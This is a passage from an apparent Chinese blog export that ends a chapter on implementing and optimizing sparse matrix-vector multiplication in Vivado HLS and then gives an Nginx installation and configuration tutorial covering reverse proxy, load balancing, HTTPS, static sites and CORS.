开始，通过递归得到。在我们的示例矩阵中，因为前 rowPtr 数组前2个元素是0和2，所以我们知道第一行有2个非0元素，即value[0] 和value[1] 。第一个非0元素在values数组中,value[0] 是3。该值所对应的列号为1，因为columnIndex[0]=0columnIndex[0]=0。以此类推，矩阵中第二行元素的个数为k\in[2,4)k∈[2,4),第三行的元素个数为k \in [4,7)k∈[4,7)。最后，共有9个非0元素在矩阵中，所以rowPtr最后一个值是9。 1234567891011121314#include "spmv.h"void spmv(int rowPtr[NUM_ROWS+1], int columnIndex[NNZ], DTYPE values[NNZ], DTYPE y[SIZE], DTYPE x[SIZE])&#123;L1: for (int i = 0; i &lt; NUM_ROWS; i++) &#123; DTYPE y0 = 0; L2: for (int k = rowPtr[i]; k &lt; rowPtr[i+1]; k++) &#123; #pragma HLS unroll factor=8 #pragma HLS pipeline y0 += values[k] * x[columnIndex[k]]; &#125; y[i] = y0; &#125;&#125; 图6.2: 主体代码演示了系数矩阵向量乘（SpMV）y=M.x的计算。采用CRS的方式，通过rowPt*、columnIndex 和 value 保存矩阵M。第一个for循环通过迭代访问每一行，第二个for循环访问每一列，实现矩阵M中非0元素和向量中对应的元素相乘并保存值在向量y中。 给定一个二维数组表示一个矩阵，通过C代码实现矩阵CRS格式。编写对应的C代码实现将矩阵从CRS格式转化为二维数组的形式。 结果表明，通过采用CRS的方式，我们能高效的实现稀疏矩阵乘法，不需要将矩阵转化为二维形式。实际上， 对于大型的矩阵仅仅只有一小部分非0元素，稀疏矩阵向量乘法会比第四章中讨论的密集矩阵向量乘高效很多。因为我们直接找到非0元素，并执行非0元素对应的运算。 6.2 基本实现图6.2 提供了基本代码对系数矩阵乘法的实现。函数spmv函数有5个参数，分别是rowPtr、columnIndex ，以及 values 对应矩阵 M 的 CRS 格式中包含的3个参数，这和图6.1中描述的数据结构等价。参数 yy 用于保存输出的结果，参数x表示输入的被乘向量xx。变量NUM_ROWS表示矩阵M中行号。变量NNZ表示矩阵中非0元素的个数。最后，变量SIZE表示数组x和数组y中元素的个数。 外层for循环标签为L1，对矩阵的行进行遍历。将矩阵当前的行与向量x相乘，得到输出的结果yy。内层循环标签为L2，实现对矩阵M中每列元素的遍历。L2循环迭代计算rowPtr[i+1]-rowPtr[i]rowPt**r[i+1]−rowPt**r[i]计算每一行非0元素的个数。每次循环计算，能从value数组中读取矩阵M的非0元素然后对应的从x数组中取得被乘向量x的值，对应相乘。cloumnIndex[k] 中的值保存了对应的列号k。 1234567891011#ifndef __SPMV_H__#define __SPMV_H__const static int SIZE = 4; // SIZE of square matrixconst static int NNZ = 9; //Number of non-zero elementsconst static int NUM_ROWS = 4;// SIZE;typedef float DTYPE;void spmv(int rowPtr[NUM_ROWS+1], int columnIndex[NNZ], DTYPE values[NNZ], DTYPE y[SIZE], DTYPE x[SIZE]);#endif // __MATRIXMUL_H__ not defined 图6.3： spmv函数和激励的头文件 6.3 测试平台图6.4 展示了一个针对spmv函数测试平台。测试平台通过定义matrixvector函数，直接实现矩阵向量乘法，它不考虑矩阵是否为稀疏矩阵以及矩阵是否采用CRS方式表示。我们比较matrixvector函数输出和spmv函数的输出。 在通常的测试平台中，需要实现的函数都会有个“黄金”参考，作为用户期望综合的结果。测试平台会比较黄金用例的输出和通过Vivado®HLS综合的代码执行结果。最好的实践方式是，测试平台既可以用于黄金用例，也可用于被综合的代码。这样就保证了两者实现的正确性。 测试平台在主函数main中执行。这里我们通过设置fail变量初始化为0，当spmv函数的输出成结果与matrixvector函数输出结果不相同是时，变量置1。定义与矩阵M相关的变量、被乘向量xx 和输出结果yy。对于矩阵M，即有普通模式，也有CSR模式（保存为values、columnIndex、rowPtr）。矩阵M 的value如图6.1中所示，输出向量yy有两种，其中y_sw数组保存matrixvector函数输出的结果，y数组保存spmv函数输出的结果。 在定义好所有的输入变量和输出变量之后，分别调用spmv函数和matrixvector函数并输入合适的数据。 接下来的for循环用于比较y_sw和y中的每一个对应的结果。如果其中一个不相同，则将fail 标志置1。最后，程序会打印测试的结果并返回fail变量。 12345678910111213141516171819202122232425262728293031323334353637#include "spmv.h"#include &lt;stdio.h&gt;void matrixvector(DTYPE A[SIZE][SIZE], DTYPE *y, DTYPE *x)&#123; for (int i = 0; i &lt; SIZE; i++) &#123; DTYPE y0 = 0; for (int j = 0; j &lt; SIZE; j++) y0 += A[i][j] * x[j]; y[i] = y0; &#125;&#125;int main()&#123; int fail = 0; DTYPE M[SIZE][SIZE] = &#123;&#123;3,4,0,0&#125;,&#123;0,5,9,0&#125;,&#123;2,0,3,1&#125;,&#123;0,4,0,6&#125;&#125;; DTYPE x[SIZE] = &#123;1,2,3,4&#125;; DTYPE y_sw[SIZE]; DTYPE values[] = &#123;3,4,5,9,2,3,1,4,6&#125;; int columnIndex[] = &#123;0,1,1,2,0,2,3,1,3&#125;; int rowPtr[] = &#123;0,2,4,7,9&#125;; DTYPE y[SIZE]; spmv(rowPtr, columnIndex, values, y, x); matrixvector(M, y_sw, x); for(int i = 0; i &lt; SIZE; i++) if(y_sw[i] != y[i]) fail = 1; if(fail == 1) printf("FAILED\n"); else printf("PASS\n"); return fail;&#125; 图6.4 ： 一个简单spmv函数的简单测试平台。测试平台生成了一个用例，并且计算矩阵的向量乘法通过稀疏矩阵乘法（spmv）和非系数矩阵乘法(matrixvector)。 这个测试平台相对简单并且可能无法充分验证所有的输入都能正常输出。最主要的原因是，它仅仅只用了一个矩阵作为例子，相反，一个好的激励会测试许多矩阵。通常，会通过随机的方式产生输入的测试用例，并且重点测试边界用例。在这个例子中，我们不仅要保证值正确计算，同时保证通过加速器正确的被执行了，而且编译时间相关的parameter改变会在实现不同加速单元值折中。最关键的是，在相同的parameter上，我们能通过随机产生很多输入数据来进行测试。编译时间相关的参数每次发生变化，都需要我们重新编译代码。 创建一个复杂的激励来，通过随机数方式生成许多组测试数据。稀疏矩阵编译时间参数应该是可以修改的（例如，SIZE，NNZ 等）。创建一个HLS综合脚本，在编译时间参数合理范围改变时，能执行代码很多次。 6.4 指定循环的属性如果直接将上述代码进行综合，我们可以得到函数运行的时钟周期及资源占用率。但是，我们不能得到模块执行所需的时钟周期、任务执行的延迟和任务执行之间的间隔。因为这些都取依赖于输入数据，由spmv函数外部因素决定。最主要的因素是，内层循环执行的次数是由矩阵M中非0元素个数决定的。非0元素的个数在代码中是由常量NNZ决定的，虽然可以调用函数计算不同大小的矩阵，但是实际迭代次数是和输入数据相关的。另外，性能也会因为非0元素的分布、综合优化的约束产生不同。更复杂的是，迭代的次数由输入决定，许多可能的输入并没有被遍历。所以，对于工具而言，不通过复杂的分析和额外的信息，工具是不能知道spmv函数执行需要多少时钟周期。Vivado®HLS 工具也不能进行上述的分析。 spmv函数能正常工作的前提条件是什么？证明给定的前提条件，矩阵中每个非0元素实是不是在对应一次内层循的执行？ 有几种方式能帮助工具进行性能的分析，其中一种方式就是想Vivado®HLS提供循环边界的额外信息。这可以通过使用loop_tripcount directive实现，它能让设计者指定最小、最大和平均迭代次数针对特定的循环。通过提供这些值， Vivado®HLS 能提供时钟周期级别的评估。 使用loop_tripcount directive 用变量指定循环的最小，最大和平均迭代次数，这样Vivado®HLS 工具能对当前设计时钟周期数目进行估计。这些不影响最后综合的结果，只会影响综合报告。 对spmv函数使用loop_tripcount directive，语法格式 # pragma HLS loop_tripcount min=X, max=Y, avg=Z 其中X，Y，Z正的常量。哪个循环需要使用directive?当改变参数（min、max和avg）以后，综合报告有什么不同？这对时钟周期有影响吗？这对资源占用有影响吗？ loop_tripcount 引导能帮助设计者对函数的性能有个原始的估计。这样能比较相同的函数通过使用不同的directives或者对代码本身重构。但是，这不能确定min、max和 avg 参数。这也很难确定边界条件min和max的值。如果有测试平台，就有一种更准确的方式用于计算spmv函数执行的时钟周期数，那就是C/RTL协同仿真。 6.5 C/RTL 协同仿真C/RTL 协同仿真能自动化测试Vivado®HLS工具生成的RTL代码，只需要在综合的时候提供测试平台。每次执行综合以后的代码和提供的测试平台，记录输入和输出结果。输入的值按照时钟转换成输入向量。这里的输入向量用于针对生成的RTL代码进行仿真，同时记录输出向量。更新综合后的代码， 再次运行测试平台并保存输入和输出数据。测试平台如果返回值是0，则表示成功；若激励返回非0值，则表示失败。 C/RTL 协同仿真流程将VIvado®HLS 生成的RTL代码，通过C 测试平台，实现时钟周期级别的仿真。这样，就能准确对生成的RTL代码进行性能评估，即使性能与输入数据有关。被综合的函数运行周期最小值，最大值，平均值以及间隔在仿真完成以后都能准确的得到。 注意这些和时钟周期相关的参数是通过激励中测试数据得到的。所以，结果的质量和测试平台的质量息息相关。如果测试平台没有很好的对函数执行测试，那么结果将不准确。另外，输入测试向量都是基于理想的时序，不能反映模型实际工作时，外部接口对函数的影响。实际的性能可能会比仿真的要低，如果执行过程中阻塞在输入数据或对外部存储的访问上。不过，对于循环边界调试时变量的情况，设计者可以通过协同仿真的方式确定时钟周期个数。 C/RTL协同仿真能提供循环边界是变量的函数的延迟。它反馈函数运行时延迟的最小值、最大值和平均值以及函数运行间隔。这些延迟和测试平台输入的数据是强相关的。 图6.5 spmv函数内部循环流水执行过程和结构 当采用图6,4提供的测试平台时，函数运行的最小值、最大值和平均值以及函数间隔是多少个时钟周期？ 6.6 循环的优化与数组的分块我们可以通过Vivado®HLS 工具得到当前函数的性能和面积的评估结果，然后可以考虑如何对函数进行优化。流水线、循环展开、数组分块是第一类最常用的优化方法。最典型的方式是从最内层的循环，然后根据需要向外层循环进行。 在这个例子中， 对最内层的L2循环进行流水线化也许是我们最先和最容易想到的优化方式。这个连续迭代的循环在执行上流水以后，总体运行会加快。如果不采用流水，L2 循环将按照串行执行。注意，L1 循环此时还是按照串行的方式执行。 图6.5演示了spmv函数在L2循环采用流水方式时运行的步骤。每次L2的循环都被II=3I**I=3流水化。流水线允许在外层循环执行一次迭代时，内层循环执行多次循环迭代。此时，内层循环II受限于递归（recurrence ）操作。II=3I**I=3是因为我们认为加法器有3个时钟周期的延迟。外部循环没有采用流水的方式，所以内层的循环必须在下外层L2循环开始执行前，计算完成并输出结果。 对最内层的L2 for 循环进行流水化，通过在spmv函数中增加流水directive如图6.2所示。II(initiation interval)最后是多少？在你指定II的值以后，最终目标的II值是增大了还是减少了？ 观察执行步骤，我们可以发现有几个因素限制了循环执行性能。第一个因素，递归（recurrence ）操作限制了循环的 II。第二个因素，外层的循环没有采用流水的方式。一种高效计算稀疏矩阵向量乘法的方式，每个时钟周期把乘法器和加法器使用起来。当前的设计离这个目标还很远。 在章节4.3中，我们探究了几种设计优化技术，其中包括对不同的循环进行流水，循环展开，数组分割。掌握在这些技术之间进行权衡是一项挑战，因为它们之间经常相互依赖。我们通常联合使用这些技术，为了得到好的性能谨慎的选择其中一种而不选择另一种也许结果会更糟糕。例如，在我们使用循环展开是，设计者需要明白它对数据访问的影响。增加了对数据访问的操作但是设计性能又受限于数据访问时，优化毫无益处。同样，如果提供了冗余的存储端口，实际中使用率不高，这样对提高性能毫无帮助反而增加了资源的消耗。 仔细思考一下上述优化技术组合后复杂多变的样式，我们建议你尝试下面的练习： 对spmv设计进行综合，采用表6.1提供的10种directives，每种都有不同的流水，展开和分割针对不同的循环和数组。这些分割在不同的数组（values、columnIndex、x）上使用。你看到结果的趋势是如何的？增加了展开和分割，是有利于还是不利于面积？性能如何？为什么？ 表6.1 稀疏矩阵向量乘法可优化的方式 L1 L2 case1 - - case2 - pipeline case3 pipeline - case4 unroll=2 - case5 - pipeline,unroll=2 case6 - pipeline,unroll=2,cyclic=2 case7 - pipeline,unroll=4 case8 - pipeline,unroll=4,cyclic=4 case9 - pipeline,unroll=8 case10 - pipeline,unroll=8,cyclic=8 case11 - pipeline,unroll=8,block=8 如果你完成了上述练习，你会发现盲目的使用优化directives，可能不会得到你期望的结果。通常在设计时， 在思考下考虑应用的特性，选择针对设计的特定优化方式。当然，这也需要一些直觉能力和一些专用工具投入使用。虽然，搞清楚像Vivado®HLS这样复杂工具中每一个细节是困难乃至不可能的，但是我们能基于关键的方面建立思考模型。 上面我们在用例3和4中考虑对外层循环L1进行流水化操作而不是对内层循环。这种变化针对一个任务，可以提高潜在的并行程度。为了完成优化，Vivado®HLS 工具必须展开代码中所有的内层循环L2 。如果循环能全部展开，这样能减少计算循环边界的时间，同时也能消除递归（recurrences）。但是代码中的内层循环Vivado HLS是无法完全展开的，因为循环边界不是常量。 例如在实现上面提到的例子3，在最外层的循环L1使用流水化directive。在不设定目标II时，II值是多少？资源占用率发生了什么变化？增加了II后资源占用率结果如何？这与之前采对L2循环进行流水化，结果有什么不同？这和最基本的设计（无 directives）相比有什么不同？当你对外层循环进行展开时，结果到底如何？（提示：检查综合后的日志信息） 另外一种增加并行化的方式是对内层循环进行局部循环展开，就像之前例子5到10。这种变化实现更多的并行化，通过在相同的循环迭代中，执行更多的操作。有些情况，Vivado HLS 工具在对内层循环进行流水化时，通过实现更多操作来提高性能。但是，这还是很难提高内层循环的II，由于内层循环的递归操作。但是，在II大于1的情况下， 许多操作可以共享同一个计算单元。 图6.6展示了一个局部展开的代码。在这段代码中，L2 循环被分成2个循环，分别为L2_1和L2_2。最内层的循环L2_2执行的次数由参数S确定。内部循环包含了最原始的L2循环，其中循环边界是由最原始的L2循环确定的。代码中，L2_1 循环包含了不确定次数的乘法和加法操作，运算次数由参数S确定，和一次递归完成累加y0 += yty0+=y**t。 注意图6.6中的代码和自动循环展开的代码是由一点点区别的。自动循环展开复制计算，但是保留每次计算先后顺序（除了当前的例子）。这就导致了计算顺序由内层循环决定，如图6.7左所示。对计算顺序进行调整后，操作上的依赖关系如图6.7 左边所示。在当前的代码中，最后累加求和是一个递归（recurrence ）。当使用浮点数据类型时，这种调整计算顺序的操作可能对程序产生改变，所以Vivado HLS对这种类型的代码不进行操作顺序自动调整。 这个设计可能会被综合、实现如图6.8所示的结果。在这个例子中，S=3S=3与III**I最匹配，乘法器的延迟正好是3。所有的运算过程都是在一个乘法器和加法器上执行。比较这个例子与图6.5中的例子，我们可以发现一些缺点。最明显的是，内层循环的流水线长度很长，实现的时候需要多个更多的周期刷新流水线的输出，才能执行下一次外层L1循环。处理一行中非零元素和执行块S 相同。一行有个3个元素和一行有一个元素计算的时间是相同的。剩下的运算也需要在循环流水线中执行，即使他们的结果没有用。为了严格的比较两个设计的特性，我们需要了解设计对矩阵每行非零元素个数的预期。 12345678910111213141516171819202122#include "spmv.h"const static int S = 7;void spmv(int rowPtr[NUM_ROWS+1], int columnIndex[NNZ], DTYPE values[NNZ], DTYPE y[SIZE], DTYPE x[SIZE])&#123; L1: for (int i = 0; i &lt; NUM_ROWS; i++) &#123; DTYPE y0 = 0; L2_1: for (int k = rowPtr[i]; k &lt; rowPtr[i+1]; k += S) &#123;#pragma HLS pipeline II=S DTYPE yt = values[k] * x[columnIndex[k]]; L2_2: for(int j = 1; j &lt; S; j++) &#123; if(k+j &lt; rowPtr[i+1]) &#123; yt += values[k+j] * x[columnIndex[k+j]]; &#125; &#125; y0 += yt; &#125; y[i] = y0; &#125;&#125; 图6.6 局部展开图6.2中smpv函数 图6.7 针对累加的两种不同方式的局部展开。左边的版本有3个加法器进行递归操作，相反右边的版本只有1个加法器进行递归累加 图6.8 图6.6中 spmv函数基于部分展开和内部流水线处理后执行过程 如果矩阵每行非零元素很少，则采用第一种实现方式较优；如果矩阵中每行非零元素较多，则第二种实现方式更好。 需要注意，这里存在一个关于先有鸡还是先有蛋的问题。我们需要知道目标器件和时钟周期，这样才能确定流水线中加法器能不能满足时序要求。只有在我们知道流水线的级数之后（也许S=1时，Vivado HLS才能识别到加法递归），我们才能选择合适版本的参数S，来满足II=1I**I=1。一旦我们确定了S，我们能通过C/RTL协同仿真来，通过一组测试数据，确定是不是达到了性能上的要求。因为循环边界是可变的，所以得到的性能参数是依赖于数据的，所以我们需要设定不同的S，来找到性能的最大值。改变器件的类型和工作频率会影响之前所有的设计！尽管看来去高层次综合（HLS）对解决问题提供的帮助不多，相比于RTL开发新版本然后进行验证，它开发起来快（代码编写方便）。 图6.8可以实现时，S 与加法器流水线等级相同。如果S设定较大，结果会怎样？如果S 设定较小，结果会怎样？如果目标II小于S会怎样？如果目标II大于S会怎样？ 6.7小结在本章节中，我们介绍了系数矩阵向量乘法（SpMV），这延续了之前对矩阵运算的研究。SpMV 显得很有趣，因为它采用了一种特别的数据结构。为了减少大量的存储，矩阵采用行压缩的方式存储，这样就要求我们以一种非直接的方式对矩阵进行访问。 这一章节首先我们了Vivado®HLS工具测试和仿真的能力。我们采用一个基于SpMV简单的激励文件，讲解HLS工作流程。另外，我们对Vivado®HLS工具中C/RTL 协同仿真进行了讲解。这对我们得到设计准确性能结果是十分重要。矩阵越不稀疏，则更多的计算需要执行。在测试平台确定以后，协同仿真可以提供程序运行的精确仿真。这样就可以达到执行周期和性能结果。最后，我们讨论了采用循环优化和数组分块对代码进行优化。 fpga并行编程]]></content>
      <categories>
        <category>SpMV</category>
      </categories>
      <tags>
        <tag>SpMV</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nginx]]></title>
    <url>%2F2019%2F05%2F19%2FNginx%2F</url>
    <content type="text"><![CDATA[Nginx安装及配置 本文参考： Nginx安装配置_菜鸟教程 Nginx中文文档 Nginx简易教程 概述什么是nginx? Nginx (engine x) 是一款轻量级的Web 服务器 、反向代理服务器及电子邮件（IMAP/POP3）代理服务器。 什么是反向代理？ 反向代理（Reverse Proxy）方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。 安装与使用安装 nginx官网下载地址：http://nginx.org，发布版本分为 Linux 和 windows 版本。 也可以下载源码，编译后运行。 从源代码编译 Nginx 把源码解压缩之后，在终端里运行如下命令： 123$ ./configure$ make$ sudo make install 默认情况下，Nginx 会被安装在 /usr/local/nginx。通过设定编译选项，你可以改变这个设定。 Windows 安装 为了安装 Nginx / Win32，需先下载它(Nginx官方下载)。然后解压之，然后运行即可。下面以 C 盘根目录为例说明下： 1nginx-0.8.54 start nginx Nginx / Win32 是运行在一个控制台程序，而非 windows 服务方式的。服务器方式目前还是开发尝试中。 使用nginx 的使用比较简单，就是几条命令。 常用到的命令如下： nginx -s stop ：快速关闭Nginx，可能不保存相关信息，并迅速终止web服务。 nginx -s quit ：平稳关闭Nginx，保存相关信息，有安排的结束web服务。 nginx -s reload ：因改变了Nginx相关配置，需要重新加载配置而重载。 nginx -s reopen ：重新打开日志文件。 nginx -c filename ：为 Nginx 指定一个配置文件，来代替缺省的。 nginx -t ：不运行，而仅仅测试配置文件。nginx 将检查配置文件的语法的正确性，并尝试打开配置文件中所引用到的文件。 nginx -v：显示 nginx 的版本。 nginx -V：显示 nginx 的版本，编译器版本和配置参数。 如果不想每次都敲命令，可以在nginx安装目录下新添一个启动批处理文件startup.bat，双击即可运行。内容如下： 123456789101112@echo offrem 如果启动前已经启动nginx并记录下pid文件，会kill指定进程nginx.exe -s stoprem 测试配置文件语法正确性nginx.exe -t -c conf/nginx.confrem 显示版本信息nginx.exe -vrem 按照指定配置去启动nginxnginx.exe -c conf/nginx.conf 如果是运行在 Linux 下，写一个 shell 脚本，大同小异。 配置nginx 配置实战我始终认为，各种开发工具的配置还是结合实战来讲述，会让人更易理解。 http反向代理配置我们先实现一个小目标：不考虑复杂的配置，仅仅是完成一个 http 反向代理。 nginx.conf 配置文件如下：注：conf / nginx.conf 是 nginx 的默认配置文件。你也可以使用 nginx -c 指定你的配置文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107#运行用户#user somebody;#启动进程,通常设置成和cpu的数量相等worker_processes 1;#全局错误日志error_log D:/Tools/nginx-1.10.1/logs/error.log;error_log D:/Tools/nginx-1.10.1/logs/notice.log notice;error_log D:/Tools/nginx-1.10.1/logs/info.log info;#PID文件，记录当前启动的nginx的进程IDpid D:/Tools/nginx-1.10.1/logs/nginx.pid;#工作模式及连接数上限events &#123; worker_connections 1024; #单个后台worker process进程的最大并发链接数&#125;#设定http服务器，利用它的反向代理功能提供负载均衡支持http &#123; #设定mime类型(邮件支持类型),类型由mime.types文件定义 include D:/Tools/nginx-1.10.1/conf/mime.types; default_type application/octet-stream; #设定日志 log_format main &apos;[$remote_addr] - [$remote_user] [$time_local] &quot;$request&quot; &apos; &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos; &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;; access_log D:/Tools/nginx-1.10.1/logs/access.log main; rewrite_log on; #sendfile 指令指定 nginx 是否调用 sendfile 函数（zero copy 方式）来输出文件，对于普通应用， #必须设为 on,如果用来进行下载等应用磁盘IO重负载应用，可设置为 off，以平衡磁盘与网络I/O处理速度，降低系统的uptime. sendfile on; #tcp_nopush on; #连接超时时间 keepalive_timeout 120; tcp_nodelay on; #gzip压缩开关 #gzip on; #设定实际的服务器列表 upstream zp_server1&#123; server 127.0.0.1:8089; &#125; #HTTP服务器 server &#123; #监听80端口，80端口是知名端口号，用于HTTP协议 listen 80; #定义使用www.xx.com访问 server_name www.helloworld.com; #首页 index index.html #指向webapp的目录 root D:_WorkspaceProjectgithubzpSpringNotesspring-securityspring-shirosrcmainwebapp; #编码格式 charset utf-8; #代理配置参数 proxy_connect_timeout 180; proxy_send_timeout 180; proxy_read_timeout 180; proxy_set_header Host $host; proxy_set_header X-Forwarder-For $remote_addr; #反向代理的路径（和upstream绑定），location 后面设置映射的路径 location / &#123; proxy_pass http://zp_server1; &#125; #静态文件，nginx自己处理 location ~ ^/(images|javascript|js|css|flash|media|static)/ &#123; root D:_WorkspaceProjectgithubzpSpringNotesspring-securityspring-shirosrcmainwebappiews; #过期30天，静态文件不怎么更新，过期可以设大一点，如果频繁更新，则可以设置得小一点。 expires 30d; &#125; #设定查看Nginx状态的地址 location /NginxStatus &#123; stub_status on; access_log on; auth_basic &quot;NginxStatus&quot;; auth_basic_user_file conf/htpasswd; &#125; #禁止访问 .htxxx 文件 location ~ /.ht &#123; deny all; &#125; #错误处理页面（可选择性配置） #error_page 404 /404.html; #error_page 500 502 503 504 /50x.html; #location = /50x.html &#123; # root html; #&#125; &#125;&#125; 好了，让我们来试试吧： 启动 webapp，注意启动绑定的端口要和nginx中的 upstream 设置的端口保持一致。 更改 host：在 C:WindowsSystem32driversetc 目录下的host文件中添加一条DNS 记录127.0.0.1 http://www.helloworld.com 启动前文中 startup.bat 的命令 在浏览器中访问 http://www.helloworld.com，不出意外，已经可以访问了。 负载均衡配置上一个例子中，代理仅仅指向一个服务器。 但是，网站在实际运营过程中，多半都是有多台服务器运行着同样的app，这时需要使用负载均衡来分流。 nginx也可以实现简单的负载均衡功能。 假设这样一个应用场景：将应用部署在 192.168.1.11:80、192.168.1.12:80、192.168.1.13:80 三台linux环境的服务器上。网站域名叫 http://www.helloworld.com，公网IP为 192.168.1.11。在公网IP所在的服务器上部署 nginx，对所有请求做负载均衡处理。 nginx.conf 配置如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748http &#123; #设定mime类型,类型由mime.type文件定义 include /etc/nginx/mime.types; default_type application/octet-stream; #设定日志格式 access_log /var/log/nginx/access.log; #设定负载均衡的服务器列表 upstream load_balance_server &#123; #weigth参数表示权值，权值越高被分配到的几率越大 server 192.168.1.11:80 weight=5; server 192.168.1.12:80 weight=1; server 192.168.1.13:80 weight=6; &#125; #HTTP服务器 server &#123; #侦听80端口 listen 80; #定义使用www.xx.com访问 server_name www.helloworld.com; #对所有请求进行负载均衡请求 location / &#123; root /root; #定义服务器的默认网站根目录位置 index index.html index.htm; #定义首页索引文件的名称 proxy_pass http://load_balance_server ;#请求转向load_balance_server 定义的服务器列表 #以下是一些反向代理的配置(可选择性配置) #proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; #后端的Web服务器可以通过X-Forwarded-For获取用户真实IP proxy_set_header X-Forwarded-For $remote_addr; proxy_connect_timeout 90; #nginx跟后端服务器连接超时时间(代理连接超时) proxy_send_timeout 90; #后端服务器数据回传时间(代理发送超时) proxy_read_timeout 90; #连接成功后，后端服务器响应时间(代理接收超时) proxy_buffer_size 4k; #设置代理服务器（nginx）保存用户头信息的缓冲区大小 proxy_buffers 4 32k; #proxy_buffers缓冲区，网页平均在32k以下的话，这样设置 proxy_busy_buffers_size 64k; #高负荷下缓冲大小（proxy_buffers*2） proxy_temp_file_write_size 64k; #设定缓存文件夹大小，大于这个值，将从upstream服务器传 client_max_body_size 10m; #允许客户端请求的最大单文件字节数 client_body_buffer_size 128k; #缓冲区代理缓冲用户端请求的最大字节数 &#125; &#125;&#125; 网站有多个webapp的配置当一个网站功能越来越丰富时，往往需要将一些功能相对独立的模块剥离出来，独立维护。这样的话，通常，会有多个 webapp。 举个例子：假如 http://www.helloworld.com 站点有好几个webapp，finance（金融）、product（产品）、admin（用户中心）。访问这些应用的方式通过上下文(context)来进行区分: http://www.helloworld.com/finance/ http://www.helloworld.com/product/ http://www.helloworld.com/admin/ 我们知道，http的默认端口号是80，如果在一台服务器上同时启动这3个 webapp 应用，都用80端口，肯定是不成的。所以，这三个应用需要分别绑定不同的端口号。 那么，问题来了，用户在实际访问 http://www.helloworld.com 站点时，访问不同 webapp，总不会还带着对应的端口号去访问吧。所以，你再次需要用到反向代理来做处理。 配置也不难，来看看怎么做吧： 1234567891011121314151617181920212223242526272829303132333435http &#123; #此处省略一些基本配置 upstream product_server&#123; server www.helloworld.com:8081; &#125; upstream admin_server&#123; server www.helloworld.com:8082; &#125; upstream finance_server&#123; server www.helloworld.com:8083; &#125; server &#123; #此处省略一些基本配置 #默认指向product的server location / &#123; proxy_pass http://product_server; &#125; location /product/&#123; proxy_pass http://product_server; &#125; location /admin/ &#123; proxy_pass http://admin_server; &#125; location /finance/ &#123; proxy_pass http://finance_server; &#125; &#125;&#125; https反向代理配置一些对安全性要求比较高的站点，可能会使用 HTTPS（一种使用ssl通信标准的安全HTTP协议）。 这里不科普 HTTP 协议和 SSL 标准。但是，使用 nginx 配置 https 需要知道几点： HTTPS 的固定端口号是 443，不同于 HTTP 的 80 端口 SSL 标准需要引入安全证书，所以在 nginx.conf 中你需要指定证书和它对应的 key 其他和 http 反向代理基本一样，只是在 Server 部分配置有些不同。 12345678910111213141516171819202122232425#HTTP服务器 server &#123; #监听443端口。443为知名端口号，主要用于HTTPS协议 listen 443 ssl; #定义使用www.xx.com访问 server_name www.helloworld.com; #ssl证书文件位置(常见证书文件格式为：crt/pem) ssl_certificate cert.pem; #ssl证书key位置 ssl_certificate_key cert.key; #ssl配置参数（选择性配置） ssl_session_cache shared:SSL:1m; ssl_session_timeout 5m; #数字签名，此处使用MD5 ssl_ciphers HIGH:!aNULL:!MD5; ssl_prefer_server_ciphers on; location / &#123; root /root; index index.html index.htm; &#125; &#125; 静态站点配置有时候，我们需要配置静态站点(即 html 文件和一堆静态资源)。 举例来说：如果所有的静态资源都放在了 /app/dist 目录下，我们只需要在 nginx.conf 中指定首页以及这个站点的 host 即可。 配置如下： 123456789101112131415161718192021222324252627worker_processes 1;events &#123; worker_connections 1024;&#125;http &#123; include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; gzip on; gzip_types text/plain application/x-javascript text/css application/xml text/javascript application/javascript image/jpeg image/gif image/png; gzip_vary on; server &#123; listen 80; server_name static.zp.cn; location / &#123; root /app/dist; index index.html; #转发任何请求到 index.html &#125; &#125;&#125; 然后，添加 HOST：127.0.0.1 http://static.zp.cn，此时，在本地浏览器访问 http://static.zp.cn ，就可以访问静态站点了。 跨域解决方案web 领域开发中，经常采用前后端分离模式。这种模式下，前端和后端分别是独立的 web 应用程序，例如：后端是 Java 程序，前端是 React 或 Vue 应用。 各自独立的 web app 在互相访问时，势必存在跨域问题。解决跨域问题一般有两种思路： CORS在后端服务器设置 HTTP 响应头，把你需要运行访问的域名加入加入 Access-Control-Allow-Origin 中。 jsonp把后端根据请求，构造json数据，并返回，前端用 jsonp 跨域。 这两种思路，本文不展开讨论。 需要说明的是，nginx 根据第一种思路，也提供了一种解决跨域的解决方案。 举例：http://www.helloworld.com 网站是由一个前端 app ，一个后端 app 组成的。前端端口号为 9000， 后端端口号为 8080。 前端和后端如果使用 http 进行交互时，请求会被拒绝，因为存在跨域问题。来看看，nginx 是怎么解决的吧： 首先，在 enable-cors.conf 文件中设置 cors ： 1234567891011121314151617181920212223242526# allow origin listset $ACAO &apos;*&apos;;# set single originif ($http_origin ~* (www.helloworld.com)$) &#123; set $ACAO $http_origin;&#125;if ($cors = &quot;trueget&quot;) &#123; add_header &apos;Access-Control-Allow-Origin&apos; &quot;$http_origin&quot;; add_header &apos;Access-Control-Allow-Credentials&apos; &apos;true&apos;; add_header &apos;Access-Control-Allow-Methods&apos; &apos;GET, POST, OPTIONS&apos;; add_header &apos;Access-Control-Allow-Headers&apos; &apos;DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type&apos;;&#125;if ($request_method = &apos;OPTIONS&apos;) &#123; set $cors &quot;$&#123;cors&#125;options&quot;;&#125;if ($request_method = &apos;GET&apos;) &#123; set $cors &quot;$&#123;cors&#125;get&quot;;&#125;if ($request_method = &apos;POST&apos;) &#123; set $cors &quot;$&#123;cors&#125;post&quot;;&#125; 接下来，在你的服务器中 include enable-cors.conf 来引入跨域配置： 12345678910111213141516171819202122232425262728# ----------------------------------------------------# 此文件为项目 nginx 配置片段# 可以直接在 nginx config 中 include（推荐）# 或者 copy 到现有 nginx 中，自行配置# www.helloworld.com 域名需配合 dns hosts 进行配置# 其中，api 开启了 cors，需配合本目录下另一份配置文件# ----------------------------------------------------upstream 